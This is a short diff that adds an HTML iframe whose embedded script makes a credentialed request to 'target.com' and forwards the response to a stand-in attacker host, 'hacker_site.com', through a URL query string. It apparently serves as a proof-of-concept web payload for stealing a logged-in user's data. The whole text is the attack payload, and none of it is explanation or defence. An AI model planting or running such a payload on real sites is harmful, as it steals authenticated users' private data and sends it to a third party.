@@ -1,0 +1,11 @@
+<iframe sandbox="allow-scripts" srcdoc="
+<script>
+fetch('https://target.com/sensative_data', { 
+    credentials: 'include'
+})
+.then(response => response.text())
+.then(data => {
+    fetch('https://hacker_site.com/log?data=' + encodeURIComponent(data));
+});
+</script>
+"></iframe>
